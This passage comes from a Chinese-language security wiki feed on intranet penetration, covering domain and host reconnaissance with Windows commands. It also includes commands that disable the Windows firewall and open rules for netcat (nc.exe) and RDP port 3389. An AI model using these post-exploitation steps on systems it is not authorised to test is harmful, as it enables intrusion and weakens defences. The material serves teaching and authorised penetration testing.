src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/2.png"></p><ul><li>本地管理员用户：当前为tahir-pc本机的tahir（管理员）用户</li></ul><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/3.png"></p><ul><li>域内用户：当前为test域内的testuser用户</li></ul><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/1.png"></p><p>​        在这三种情况中，如果当前内网中存在域，那么本地普通用户只能查询本机相关信息，不能查询域内信息，而本地管理员用户和域内用户可以查询域信息。原因是：域内所有查询都是通过域控制器实现的（基于LDAP协议），而这个查询需要经过权限认证，所以只有与用户才拥有这个权限。当域用户执行查询命令时，会自动使用kerberos协议进行认证，无须额外输入账号和密码。</p><p>​        本地管理员Administrator权限可以直接提升为Ntauthority或者System权限，因此在域中，除普通用户外，所有机器都有一个机器用户（用户名是机器名加上$）。本质上，机器的system用户对应的就是域里面的机器用户。所以使用System权限可以运行域内的查询命令。</p><h3 id="获取域SID"><a href="#获取域SID" class="headerlink" title="获取域SID"></a>获取域SID</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/4.png"></p><p>当前域test的SID为S-1-5-21-172314476-3001021905-2129267535。域用户testuser的SID为S-1-5-21-172314476-3001021905-2129267535-1105.</p><h3 id="查询指定用户的详细信息"><a href="#查询指定用户的详细信息" class="headerlink" title="查询指定用户的详细信息"></a>查询指定用户的详细信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user testuser /domain</span><br></pre></td></tr></table></figure><p>当前testuser用户在本地组中没有本地管理员权限，在域中属于Domain Users组</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/5.png"></p><h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><p>获取到相关主机信息后，就要判断当前内网中是否存在域。如果当前内网中存在域，就需要判断所控机器是否在域环境中</p><h4 id="使用ipconfig命令"><a href="#使用ipconfig命令" class="headerlink" title="使用ipconfig命令"></a>使用ipconfig命令</h4><p>执行ipconfig可以查看网关IP地址、DNS的IP地址、域名、本机是否和DNS服务器处于同一个网段的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/6.png"></p><p>通过反向解析查询命令nslookup来解析域名的IP地址。用解析得到的IP地址进行对比，判断域控制器和DNS服务器是否在同一台服务器上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup test.domain</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/7.png"></p><p>发现域控制器和DNS服务器在同一台服务器上。</p><h4 id="查看系统详细信息"><a href="#查看系统详细信息" class="headerlink" title="查看系统详细信息"></a>查看系统详细信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><ul><li>域：既是域名（当前域名为test.domain）</li><li>登录服务器：为域控制器。如果“域”为“WORKGROUP”，表示当前服务器不在域内。</li></ul><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/8.png"></p><h4 id="查询登录域及登录用户信息"><a href="#查询登录域及登录用户信息" class="headerlink" title="查询登录域及登录用户信息"></a>查询登录域及登录用户信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/9.png"></p><ul><li>工作站域DNS名称：为域名（如果为“WORKGROUP”，表示当前为非域环境）</li><li>登录域：用于表示当前登录的用户是域用户还是本地用户，此处表示当前登录的用户是域用户。</li></ul><h4 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p>存在三种情况：</p><ul><li>存在域，但当前用户不是域用户</li></ul><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/10.png"></p><ul><li>存在域，且当前用户是域用户</li></ul><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/11.png"></p><ul><li>当前网络环境为工作组，不存在域</li></ul><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/12.png"></p><h3 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h3><h4 id="利用NetBIOS探测内网"><a href="#利用NetBIOS探测内网" class="headerlink" title="利用NetBIOS探测内网"></a>利用NetBIOS探测内网</h4><p>NetBIOS是局域网程序使用的一种应用程序编程接口（API），为程序提供了请求低级服务的统一的命令集，为局域网提供了网络及其他的特殊功能。几乎所有局域网都是在NetBIOS协议的基础上工作的。NetBIOS也是计算机的标识名，主要用于局域网中计算机的相互访问。NetBIOS的工作流程就是正常机器名解析查询应答过程，因此推荐优先使用。</p><p>nbtscan是一个命令行工具，用于扫描本地或者远程TCP/IP网络上的开放的NetBIOS名称服务器。nbtscan有windows和linux两个版本，体积小不需要额外的库或dll文件。</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/13.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe 192.168.1.0/20</span><br></pre></td></tr></table></figure><p>参数说明</p><table><thead><tr><th>Token</th><th>含义</th></tr></thead><tbody><tr><td>SHARING</td><td>该机器中存在正在运行的文件和打印机共享服务，但不一定有内容共享</td></tr><tr><td>DC</td><td>该机器可能是域控制器</td></tr><tr><td>U=USER</td><td>该机器中有登录名为User的用户（不准确）</td></tr><tr><td>HS</td><td>该机器中可能安装了IIS服务器</td></tr><tr><td>EXCHANGE</td><td>该机其中可能安装了Exchange</td></tr><tr><td>NOTES</td><td>该机器中可能安装了Lotus Notes电子邮件客户端</td></tr><tr><td>?</td><td>没有识别出该机的NetBIOS资源（可以使用 -F 选项再次扫描）</td></tr></tbody></table><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><blockquote><ul><li><a href></a></li><li><a href></a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Metadata&quot;&gt;&lt;a href=&quot;#Metadata&quot; class=&quot;headerlink&quot; title=&quot;Metadata&quot;&gt;&lt;/a&gt;Metadata&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;th&gt;Tahir&lt;/t</summary>
      
    
    
    
    <category term="4. 内网安全攻防" scheme="http://example.com/categories/4-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/"/>
    
    <category term="1-内网信息搜集" scheme="http://example.com/categories/4-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
    
    <category term="1-内网信息搜集" scheme="http://example.com/tags/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>主机信息搜集</title>
    <link href="http://example.com/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>http://example.com/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2021-08-04T03:14:41.000Z</published>
    <updated>2021-08-04T03:34:01.296Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Metadata"><a href="#Metadata" class="headerlink" title="Metadata"></a>Metadata</h2><table><thead><tr><th>Author</th><th>Tahir</th></tr></thead><tbody><tr><td>Creation Date</td><td>2021/08/04</td></tr><tr><td>Modification Date</td><td>2021/08/04</td></tr><tr><td>Tactics</td><td>None</td></tr><tr><td>Techniques</td><td>None</td></tr></tbody></table><h2 id="Tactics"><a href="#Tactics" class="headerlink" title="Tactics"></a>Tactics</h2><p>None</p><h2 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h2><p>None</p><h2 id="Procedure"><a href="#Procedure" class="headerlink" title="Procedure"></a>Procedure</h2><p>本机信息包括操作系统、权限、内网IP地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机：操作系统、应用软件、补丁、服务、杀毒软件一般都是批量安装的。</p><h2 id="手动收集信息"><a href="#手动收集信息" class="headerlink" title="手动收集信息"></a>手动收集信息</h2><h3 id="查询网络配置信息"><a href="#查询网络配置信息" class="headerlink" title="查询网络配置信息"></a>查询网络配置信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/1.png"></p><h3 id="查询操作系统和软件信息"><a href="#查询操作系统和软件信息" class="headerlink" title="查询操作系统和软件信息"></a>查询操作系统和软件信息</h3><h4 id="查询操作系统和版本信息（分别对应中英文系统）"><a href="#查询操作系统和版本信息（分别对应中英文系统）" class="headerlink" title="查询操作系统和版本信息（分别对应中英文系统）"></a><strong>查询操作系统和版本信息（分别对应中英文系统）</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/2.png"></p><h4 id="查询系统体系结构"><a href="#查询系统体系结构" class="headerlink" title="查询系统体系结构"></a><strong>查询系统体系结构</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/3.png"></p><h4 id="查看安装的软件及版本、路径"><a href="#查看安装的软件及版本、路径" class="headerlink" title="查看安装的软件及版本、路径"></a><strong>查看安装的软件及版本、路径</strong></h4><p>利用wmic命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/4.png"></p><p>利用PowerShell命令，收集软件信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/6.png"></p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/5.png"></p><h4 id="查询本机服务信息"><a href="#查询本机服务信息" class="headerlink" title="查询本机服务信息"></a><strong>查询本机服务信息</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/7.png"></p><h4 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a><strong>查询进程列表</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/8.png"></p><p>利用wmic命令，查询进程信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/9.png"></p><h4 id="查询启动程序信息"><a href="#查询启动程序信息" class="headerlink" title="查询启动程序信息"></a><strong>查询启动程序信息</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/10.png"></p><h4 id="查询计划任务"><a href="#查询计划任务" class="headerlink" title="查询计划任务"></a><strong>查询计划任务</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/11.png"></p><h4 id="查询主机开机时间"><a href="#查询主机开机时间" class="headerlink" title="查询主机开机时间"></a><strong>查询主机开机时间</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/12.png"></p><h4 id="查询用户列表"><a href="#查询用户列表" class="headerlink" title="查询用户列表"></a><strong>查询用户列表</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/13.png"></p><p>执行命令获取本地管理员（包含域用户）信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/14.png"></p><h4 id="查询当前用户"><a href="#查询当前用户" class="headerlink" title="查询当前用户"></a><strong>查询当前用户</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/15.png"></p><h4 id="列出或断开本地计算机所连接的客户端之间的会话"><a href="#列出或断开本地计算机所连接的客户端之间的会话" class="headerlink" title="列出或断开本地计算机所连接的客户端之间的会话"></a><strong>列出或断开本地计算机所连接的客户端之间的会话</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/16.png"></p><h4 id="查询端口列表"><a href="#查询端口列表" class="headerlink" title="查询端口列表"></a><strong>查询端口列表</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/17.png"></p><h4 id="查询补丁列表"><a href="#查询补丁列表" class="headerlink" title="查询补丁列表"></a><strong>查询补丁列表</strong></h4><p>利用systeminfo命令，查看系统详细信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/18.png"></p><p>利用wmic命令查看安装在系统中的补丁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/19.png"></p><h4 id="查询本机共享列表"><a href="#查询本机共享列表" class="headerlink" title="查询本机共享列表"></a><strong>查询本机共享列表</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/20.png"></p><p>利用wmic命令查找共享列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/21.png"></p><h4 id="查询路由表及所有可用接口的ARP缓存表"><a href="#查询路由表及所有可用接口的ARP缓存表" class="headerlink" title="查询路由表及所有可用接口的ARP缓存表"></a><strong>查询路由表及所有可用接口的ARP缓存表</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/22.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/23.png"></p><h4 id="查询或修改防火墙配置"><a href="#查询或修改防火墙配置" class="headerlink" title="查询或修改防火墙配置"></a><strong>查询或修改防火墙配置</strong></h4><p>关闭防火墙</p><p>Windows server 2003及以前的版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure><p>Windows server 2003以后的版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p>查看防火墙配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/24.png"></p><p>修改防火墙配置</p><p>Windows server 2003及以前的版本，允许指定程序全部连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br></pre></td></tr></table></figure><p>Windows server 2003以后的版本：</p><p>允许指定程序入站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;</span><br></pre></td></tr></table></figure><p>允许指定程序出站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;</span><br></pre></td></tr></table></figure><p>允许3389端口放行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;remote desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><p>自定义防火墙日志的储存位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 